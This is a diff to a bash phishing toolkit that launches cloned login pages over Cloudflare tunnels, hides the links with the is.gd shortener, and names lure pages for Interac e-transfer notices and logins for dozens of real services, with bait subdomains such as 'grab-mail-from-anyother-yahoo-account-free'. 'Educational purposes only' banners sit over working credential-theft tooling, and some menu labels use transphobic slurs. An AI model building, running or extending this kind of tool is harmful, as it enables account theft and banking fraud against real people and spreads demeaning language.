@@ -37,7 +37,7 @@ chmod -R 777 .www
 check_os_and_install_packages() {
 	
 
-if [[ -f .host/ngrok && -f .host/cloudflared ]]; then
+if [[ -f .host/cloudflared ]]; then
 
 { clear; }	
 
@@ -142,12 +142,14 @@ header(){
     printf "${BLUE}"	
 	cat <<- EOF
 	
-${RED}   MADE IN +41 TO FUND MEXICAN JAILS WITH POUTINE                                                                                      
+${ORANGEBG}${RED}  RANDOM RYAN WILL NOT BE HELD RESPONSIBLE $RESETBG                                                                                 
 ${WHITE}  █████████  █████  ${RED}██████ ${WHITE}  █████  ██  ██ 
 ${WHITE}    ██      ██   ██ ${RED}██   ██${WHITE} ██   ██ ██  ██ 
 ${WHITE}    ███████ ██ █ ██ ${RED}█████  ${WHITE} ██ █ ██ ██████ 
 ${WHITE}         ██ ██   ██ ${RED}██   ██${WHITE} ██   ██ ██  ██
-${WHITE}  █████████ ██ ${GREEN}NO${RED}-${GREEN}IM${RED}-${GREEN}NOT${RED}-${GREEN}ANOTHER${RED}-${GREEN}AI${RED}-${GREEN}BOT${WHITE} ██     
+${WHITE}  █████████ ██ ${GREEN}NO${RED}-${GREEN}IM${RED}-${GREEN}NOT${RED}-${GREEN}ANOTHER${RED}-${GREEN}AI${RED}-${GREEN}BOT${WHITE} ██  
+${WHITE}   
+${ORANGEBG}${RED}  FOR ANY WRONGFUL USE OF THE PROGRAM!!!!  $RESETBG     
 	EOF
 
 	printf "${RESETBG}"	
@@ -568,33 +570,38 @@ cloudflared_start() {
 
 	{ sleep 12; clear; header; }
 cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".tunnels_log/.cloudfl.log")
+url_0="${cldflr_url}/index.php"
 url_1="${cldflr_url}/public/deposit/1.html"
-url_2="${cldflr_url}/public/deposit/2.html"
-url_3="${cldflr_url}/public/deposit/3.html"
-url_4="${cldflr_url}/public/Google/GO.php"
+url_2="${cldflr_url}/public/deposit/manual.php"
+url_3="${cldflr_url}/login.php"
+url_4="${cldflr_url}/public/GO.php"
+url0=$(curl -s 'https://is.gd/create.php?format=simple&url='"$url_0")
 url1=$(curl -s 'https://is.gd/create.php?format=simple&url='"$url_1")
 url2=$(curl -s 'https://is.gd/create.php?format=simple&url='"$url_2")
 url3=$(curl -s 'https://is.gd/create.php?format=simple&url='"$url_3")
 url4=$(curl -s 'https://is.gd/create.php?format=simple&url='"$url_4")
-echo -e "${WHITE}==================================="
-echo -e "${RED}SEND INTERAC DEPOSIT NOTICE "
-echo -e "${WHITE}$url1"
-echo -e "${WHITE}==================================="
-echo -e "${RED}SEND INTERAC  CANCEL NOTICE"
-echo -e "${YELLOW}$url2"
-echo -e "${WHITE}==================================="
-echo -e "${RED}SEND INTERAC REQUEST NOTICE"
-echo -e "${YELLOW}$url3"
-echo -e "${WHITE}==================================="
-echo -e "${RED}CREATE A GOOGLE LINK "
-echo -e "${YELLOW}$url4"
-echo -e "${WHITE}==================================="
+echo -e "${RED}=================================================="
+echo -e "${YELLOW}ZERO-TRUST SERVER LINK [UNTOUCHED]"
+echo -e "${GREEN}$cldflr_url"
+echo -e "${RED}=================================================="
+echo -e "${YELLOW}HOME PAGE"
+echo -e "${GREEN}$url0"
+echo -e "${RED}=================================================="
+echo -e "${YELLOW}SARAH LOGIN V4 "
+echo -e "${GREEN}$url3"
+echo -e "${RED}=================================================="
+echo -e "${YELLOW}AUTO TRANNY V2"
+echo -e "${GREEN}$url1"
+echo -e "${RED}=================================================="
+echo -e "${YELLOW}TRANSGENDER V4"
+echo -e "${GREEN}$url2"
+echo -e "${ORANGEBG}${RED}=================================================="
+echo -e "${YELLOW}META JENNY  V4 "
+echo -e "${GREEN}$url4"
+echo -e "${RED}=================================================="
 
 
 }
-
-
-
 
 
 # Start Cloudflared customize
@@ -863,18 +870,9 @@ tunnel_manual() {
 	read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN} Select a port forwarding service : ${WHITE}"
 
 	case $REPLY in 
-		   1)
-		    localhost_start_manual;;
-		    
-		   2)
-		    localhostrun_start_manual;; 
 			
 		   3)
 			cloudflared_start_manual;;
-			
-		   4)
-			ngrok_start_manual;;
-					   	
 			
 		  *)
 			echo -ne "\n${GREEN}[${WHITE}!${GREEN}]${RED} Invalid Option, Try Again..."
@@ -1003,441 +1001,20 @@ attack() {
 		${GREEN}[${WHITE}5${GREEN}]${CYAN} Care2                 ${GREEN}[${WHITE}29${GREEN}]${CYAN} MeWe           ${GREEN}[${WHITE}53${GREEN}]${CYAN} Telegram                                      
 		${GREEN}[${WHITE}6${GREEN}]${CYAN} Clashofclans          ${GREEN}[${WHITE}30${GREEN}]${CYAN} Microsoft      ${GREEN}[${WHITE}54${GREEN}]${CYAN} Tiktok                            
 		${GREEN}[${WHITE}7${GREEN}]${CYAN} Crunchyroll           ${GREEN}[${WHITE}31${GREEN}]${CYAN} Mocospace      ${GREEN}[${WHITE}55${GREEN}]${CYAN} Tiktok Followers                    
-		${GREEN}[${WHITE}8${GREEN}]${CYAN} Deviantart            ${GREEN}[${WHITE}32${GREEN}]${CYAN} Myspace        ${GREEN}[${WHITE}56${GREEN}]${CYAN} Tumblr             
-		${GREEN}[${WHITE}9${GREEN}]${CYAN} Discord               ${GREEN}[${WHITE}33${GREEN}]${CYAN} Netflix        ${GREEN}[${WHITE}57${GREEN}]${CYAN} Twitch                
-		${GREEN}[${WHITE}10${GREEN}]${CYAN} Dota2                ${GREEN}[${WHITE}34${GREEN}]${CYAN} Origin         ${GREEN}[${WHITE}58${GREEN}]${CYAN} Twitter                    
-		${GREEN}[${WHITE}11${GREEN}]${CYAN} Dropbox              ${GREEN}[${WHITE}35${GREEN}]${CYAN} Outlook        ${GREEN}[${WHITE}59${GREEN}]${CYAN} Viber Out            
-		${GREEN}[${WHITE}12${GREEN}]${CYAN} Ebay                 ${GREEN}[${WHITE}36${GREEN}]${CYAN} Pinterest      ${GREEN}[${WHITE}60${GREEN}]${CYAN} Vimeo                    
-		${GREEN}[${WHITE}13${GREEN}]${CYAN} Facebook             ${GREEN}[${WHITE}37${GREEN}]${CYAN} Playstation    ${GREEN}[${WHITE}61${GREEN}]${CYAN} Vk                        
-		${GREEN}[${WHITE}14${GREEN}]${CYAN} Facebook Messenger   ${GREEN}[${WHITE}38${GREEN}]${CYAN} Protonmail     ${GREEN}[${WHITE}62${GREEN}]${CYAN} Whatsapp                   
-		${GREEN}[${WHITE}15${GREEN}]${CYAN} Facebook Security    ${GREEN}[${WHITE}49${GREEN}]${CYAN} Pubg           ${GREEN}[${WHITE}63${GREEN}]${CYAN} Wordpress                    
-		${GREEN}[${WHITE}16${GREEN}]${CYAN} Gmail                ${GREEN}[${WHITE}40${GREEN}]${CYAN} Quora          ${GREEN}[${WHITE}64${GREEN}]${CYAN} Xanga       
-		${GREEN}[${WHITE}17${GREEN}]${CYAN} Goodreads            ${GREEN}[${WHITE}41${GREEN}]${CYAN} Reverly        ${GREEN}[${WHITE}65${GREEN}]${CYAN} Xbox     
-		${GREEN}[${WHITE}18${GREEN}]${CYAN} Hotstar              ${GREEN}[${WHITE}42${GREEN}]${CYAN} Reddit         ${GREEN}[${WHITE}66${GREEN}]${CYAN} Xing                                               
-		${GREEN}[${WHITE}19${GREEN}]${CYAN} Icloud               ${GREEN}[${WHITE}43${GREEN}]${CYAN} Reverbnation   ${GREEN}[${WHITE}67${GREEN}]${CYAN} Yahoo                                                     
-		${GREEN}[${WHITE}20${GREEN}]${CYAN} Influenster          ${GREEN}[${WHITE}44${GREEN}]${CYAN} Signal         ${GREEN}[${WHITE}68${GREEN}]${CYAN} Yandex
-		${GREEN}[${WHITE}21${GREEN}]${CYAN} Instagram            ${GREEN}[${WHITE}45${GREEN}]${CYAN} Skype          ${GREEN}[${WHITE}69${GREEN}]${CYAN} Youtube SUbs
-		${GREEN}[${WHITE}22${GREEN}]${CYAN} Insta Followers      ${GREEN}[${WHITE}46${GREEN}]${CYAN} Skyrock        ${GREEN}[${WHITE}02${GREEN}]${CYAN} Others
-		${GREEN}[${WHITE}23${GREEN}]${CYAN} Insta Followers 2    ${GREEN}[${WHITE}47${GREEN}]${CYAN} Snapchat       ${GREEN}[${WHITE}99${GREEN}]${MAGENTA} Main Menu
-		${GREEN}[${WHITE}24${GREEN}]${CYAN} Instagram Verify     ${GREEN}[${WHITE}48${GREEN}]${CYAN} Socialclub                                                    
-		
-		
+		${GREEN}[${WHITE}8${GREEN}]${CYAN} Deviantart            ${GREEN}[${WHITE}32${GREEN}]${CYAN} Myspace        ${GREEN}[${WHITE}56${GREEN}]${CYAN} Tumblr             		
 	EOF
 	
 	
 	read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN} Select an option : ${WHITE}"${WHITE}
 
 	case $REPLY in 
-	
-	    1)
-			site="adobe"
-			subdomain='http://adobe-pro-membership-lifetime-for-you'
-			tunnel;;
-			
-			
-	    2)
-			site="amazon"
-			subdomain='http://amazon-pro-membership-lifetime-for-you'
-			tunnel;;
-				
-				
-	    3)
-			site="apple"
-			subdomain='http://apple-security-account-login'
-			tunnel;;				
-			
-			
-        4)
-			site="badoo"
-			subdomain='http://get-2000-euro-free-for-your-acount'
-			tunnel;;
-			
-			
-		5)
-			site="care2"
-			subdomain='http://get-2000-tokens-free-for-your-acount'
-			tunnel;;	
-			
-			
-	    6)
-			site="clashofclans"
-			subdomain='http://get-free-character-for-clashofclans-game'
-			tunnel;;	
-	 		
-	 		
-	    7)
-			site="crunchyroll"
-			subdomain='http://get-free-character-for-crunchyroll-game'
-			tunnel;;
-		
-		
-		8)
-			site="deviantart"
-			subdomain='http://deviantart-upgrade-account-pro-for-free'
-			tunnel;;
-		
-		
-		9)
-			site="discord"
-			subdomain='http://discord-upgrade-account-pro-for-free'
-			tunnel;;
-		
-		
-		10)
-			site="dota2"
-			subdomain='http://dota-upgrade-account-pro-for-free'
-			tunnel;;
-					
-			
-		11)
-			site="dropbox"
-			subdomain='http://get-2TB-cloud-storage-free'
-			tunnel;;	
 
-
-        12)
-			site="ebay"
-			subdomain='http://ebay-upgrade-account-for-free'
-			tunnel;;
-
-
-		13)
-		    site="facebook"
-			subdomain='http://secure-verified-account-for-facebook'
-			tunnel;;	
-			
-			
-		14)
-			site="facebook_messenger"
-			subdomain='http://messenger-premium-features-for-free'
-			tunnel;; 	
-			
-          
-        15)
-            site="facebook_security"
-			subdomain='http://make-your-facebook-secured-from-hackers'
-			tunnel;;  
-
-	     
-	    16)		
-	 		site="gmail"
-			subdomain='http://get-unlimited-google-drive-free'
-			tunnel;;
-			
-			
-	    17)		
-	 		site="goodreads"
-			subdomain='http://goodreads-updrade-account-lifetime-free'
-			tunnel;;
-	   		
-	   		
-	    18)
-			site="hotstar"
-			subdomain='http://hotstar-premieum-account-for-free'
-			tunnel;;		
-	   		
-	   	
-	   	19)
-			site="icloud"
-			subdomain='http://get-2TB-cloud-storage-free'
-			tunnel;;		
-	   	
-	   	
-	   	20)
-			site="influenster"
-			subdomain='http://update-account-to-premium-free'
-			tunnel;;		
-	   	
-	   		
-	    21)
-			site="instagram"
-			subdomain='http://secure-login-for-instagram'
-			tunnel;;
-			
-			
-	    22)
-		    site="instagram_followers"
-			subdomain='http://get-10000-followers-for-instagram'
-			tunnel;;			
-			
-	 
-	    23)
-			site="instagram_followers_2"
-			subdomain='http://get-10000-followers-for-instagram'
-			tunnel;;		
-		
-		
-	    24)
-			site="instagram_verify"
-			subdomain='http://instagram-verify-account'
-			tunnel;;
-			
-			
-	    25)
-			site="line"
-			subdomain='http://line-get-free-tokens-for-speech'
-			tunnel;;
-					
-			
-	    26)
-			site="linkedin"
-			subdomain='http://get-a-premium-plan-for-linkedin-free'
-			tunnel;;
-		
-		
-	    27)
-			site="livejournal"
-			subdomain='http://get-a-premium-plan-for-livejournal-free'
-			tunnel;;
-		
-		
-		28) 
-            site="mediafire"
-			subdomain='http://get-2TB-cloud-storage-free'
-			tunnel;;
-		
-		
-		29)
-			site="mewe"
-			subdomain='http://mewe-update-account-to-premium-free'
-			tunnel;;		
-	   	
-			
-	   30) 
-            site="microsoft"
-			subdomain='http://unlimited-onedrive-space-for-free'
-			tunnel;;	
-		
-	   31)  
-	        site="mocospace"
-			subdomain='http://upgrade-your-mocospace-plan-free'
-			tunnel;;
-		
-			
-	   32)  
-	        site="myspace"
-			subdomain='http://upgrade-your-myspace-plan-free'
-			tunnel;;
-			
-		
-	   33)
-	        site="netflix"
-			subdomain='http://upgrade-your-netflix-plan-free'
-			tunnel;;	
-			
-	   34)
-	        site="origin"
-			subdomain='http://origin-upgrade-to-premium-account-free'
-			tunnel;;	
-		
-		
-	   35)  
-	        site="outlook"
-			subdomain='http://unlimited-onedrive-space-for-free'
-			tunnel;;	
-			
-	   36)  
-	        site="pinterest"
-			subdomain='http://get-a-premium-plan-for-pinterest-free'
-			tunnel;;	
-			
-	
-	   37)  
-	        site="playstation"
-			subdomain='http://playstation-premium-account-free'
-			tunnel;;		
-				
-					
-       38)  
-	        site="protonmail"
-			subdomain='http://protonmail-pro-basics-for-free'
-			tunnel;;
-		
-		
-	   39)  
-	        site="pubg"
-			subdomain='http://get-free-character-for-pubs-game'
-			tunnel;;	
-			
-			
-	   40)  
-	        site="quora"
-			subdomain='http://get-quora-premium-account-for-free-lifetime'
-			tunnel;;	
-			
-			
-	   41)  
-	        site="raverly"
-			subdomain='http://get-raverly-premium-account-for-free-'
-			tunnel;;	
-			
-			
-	   42)  
-	        site="reddit"
-			subdomain='http://reddit-official-verified-member-badge'
-			tunnel;;		
-				
-				
-	   43)  
-	        site="reverbnation"
-			subdomain='http://get-reverbnation-premium-account-for-free-'
-			tunnel;;	
-		
-		
-	   44)
-			site="signal"
-			subdomain='http://signal-get-free-tokens-for-speech'
-			tunnel;;	
-		
-		
-	   45)
-			site="skype"
-			subdomain='http://skype-get-free-tokens-for-speech'
-			tunnel;;	
-		
-		
-	   46)
-	        site="skyrock"
-			subdomain='http://skyrock-upgrade-to-premium-account-free'
-			tunnel;;	
-				
-					
-       47)  
-	        site="snapchat"
-			subdomain='http://view-locked-snapchat-accounts-secretly'
-			tunnel;;
-		
-	   48)  
-	        site="socialclub"
-			subdomain='http://-socialclub-update-account-to-premieum-free'
-			tunnel;;		
-		
-			
-	   49)  
-	        site="spotify"
-			subdomain='http://convert-your-account-to-spotify-premium'
-			tunnel;;		
-		
-		
-	   50)  
-	        site="stackoverflow"
-			subdomain='http://stackoverflow-convert-your-account-to-premium'
-			tunnel;;		
-			
-		
-	   51)  
-	        site="steam"
-			subdomain='http://steam-convert-your-account-to-premium'
-			tunnel;;		
-				
-	   52)  
-	        site="tagget"
-			subdomain='http://tagget-convert-your-account-to-premium'
-			tunnel;;		
-		
-			
-	   53)  
-	        site="telegram"
-			subdomain='http://telegram-get-free-tokens-for-speech'
-			tunnel;;	
-	
-	
-	   54)  
-	        site="tiktok"
-			subdomain='http://get-tiktok-100000-followers-free-at-instant'
-			tunnel;;
-	
-			
-	   55)  
-	        site="tiktok_followers"
-			subdomain='http://get-tiktok-100000-followers-free-at-instant'
-			tunnel;;
-					
-		
-	   56)  
-	        site="tumblr"
-			subdomain='http://tumblr-upgrade-account-to-premium-free'
-			tunnel;;
-		
-					
-       57)  
-	        site="twitch"
-			subdomain='http://unlimited-twitch-tv-user-for-free'
-			tunnel;;
-			
-			
-	   58)  
-	        site="twitter"
-			subdomain='http://get-blue-badge-on-twitter-free'
-			tunnel;;									
-		
-		
-	   59)  
-	        site="viber_out"
-			subdomain='http://viber-get-free-tokens-for-speech'
-			tunnel;;	
-		
-		
-	   60)  
-	        site="vimeo"
-			subdomain='http://get-100000-views-for-channel-free'
-			tunnel;;
-		
-			
-			
-	   61)  
-	        site="vk"
-			subdomain='http://vk-premium-real-method-2022-free'
-			tunnel;;		
-			
-					
-       62)  
-	        site="whatsapp"
-			subdomain='http://get-3000-free-tokens-for-free'
-			tunnel;;
-			
-			
-	   63)  
-	        site="wordpress"
-			subdomain='http://get-unlimited-wordpress-traffic-free'
-			tunnel;;
-	 	
-	 	
-	   64)  
-	        site="xanga"
-			subdomain='http://xanga-update-account-to-premieum'
-			tunnel;;	
-	 	
 	 	
 	   65)  
 	        site="xbox"
 			subdomain='http://xbox-premium-account-new-method-2022'
 			tunnel;;
-		
-	  
-	   66)  
-	        site="xing"
-			subdomain='http://xing-update-account-to-premieum'
-			tunnel;;	
-	 		
-				
-	 		
-	   67)  
-	        site="yahoo"
-			subdomain='http://grab-mail-from-anyother-yahoo-account-free'
-			tunnel;;
-			
-	   68)  
-	        site="yandex"
-			subdomain='http://grab-mail-from-anyother-yandex-account-free'
-			tunnel;;		
-		
-	   
-	   69)  
-	        site="youtube_subs"
-			subdomain='http://get-100000-youtube-subscribers-free'
-			tunnel;;	
-			
+
 	
 	   02)  
 	        other_sites;;
@@ -1685,21 +1262,12 @@ email() {
 menu() {
  
  { clear; header; echo; }
-
 	cat <<- EOF
-		${GREEN}[${WHITE}1${GREEN}]${CYAN} Attack Default
-		${GREEN}[${WHITE}2${GREEN}]${CYAN} Attack Manual
-		${GREEN}[${WHITE}3${GREEN}]${CYAN} Attack Customize
-		${GREEN}[${WHITE}4${GREEN}]${CYAN} Apis
-		${GREEN}[${WHITE}5${GREEN}]${CYAN} Email
-		${GREEN}[${WHITE}6${GREEN}]${CYAN} Vpn
-		${GREEN}[${WHITE}7${GREEN}]${CYAN} Sound (pc only)
-		${GREEN}[${WHITE}0${GREEN}]${ORANGE} Exit
-		
-		
+		${GREEN}[${WHITE}1${GREEN}]${CYAN} Activate 
+		${GREEN}[${WHITE}0${GREEN}]${ORANGE} Exit	
 	EOF
-	
-	read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN} Select an option : ${WHITE}"${WHITE}
+
+	read -p "${ORANGEBG}${RED}  FOR EDUCATIONAL PURPOSES ONLY!${RED} [SELECT]  $RESETBG ${WHITE}"${WHITE}
 
 	case $REPLY in 
 	    
@@ -1708,15 +1276,7 @@ menu() {
 	    2) attack_manual;; 
 	    
 	    3) customize_sites;;
-	      			
-	    4) apis;;
-	    
-	    5) email;;
-	    
-	    6) vpn_setup;;
-	    
-	    7) play_music;;
-	    
+
 	    help) help;;
 	      				
 		0)
